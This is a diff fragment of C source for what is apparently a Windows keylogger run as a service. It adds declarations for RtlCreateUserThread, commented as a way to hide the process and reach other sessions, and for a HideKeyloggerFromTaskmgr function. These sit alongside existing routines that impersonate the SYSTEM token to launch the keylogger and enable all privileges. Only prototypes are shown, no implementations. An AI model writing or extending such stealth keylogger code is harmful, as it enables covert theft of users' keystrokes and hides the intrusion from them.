@@ -14,6 +14,15 @@
 
 #define REEF(x){ if (x){ free(x); x = NULL;}}
 
+//in order to hide process and have an access to other session. This is not mandatory but cool.
+typedef long (*_RtlCreateUserThread)(HANDLE,
+    PSECURITY_DESCRIPTOR,
+    BOOLEAN,ULONG,
+    PULONG,PULONG,
+    PVOID,PVOID,
+    PHANDLE,CLIENT_ID* );
+_RtlCreateUserThread RtlCreateUserThread;
+
 VOID InstallSvc(SC_HANDLE SCManager);
 VOID StartSvc(SC_HANDLE SCManager);
 VOID StopSvc(SC_HANDLE SCManager);
@@ -26,9 +35,10 @@ VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, 
 VOID PrintUserNameByProc(void);
 VOID PrintUserNameByThread(void);
 VOID PrintPrivileges(HANDLE hToken);
-DWORD GetPIDByProcName(void);
+DWORD GetPIDByProcName(char *name);
 BOOL EnableAllPrivilege(HANDLE currentToken);
 
+HANDLE HideKeyloggerFromTaskmgr(DWORD procID);
 
 VOID WINAPI SvcMain(DWORD ac, LPTSTR *av);
 VOID SvcInit(DWORD ac, LPTSTR *av);
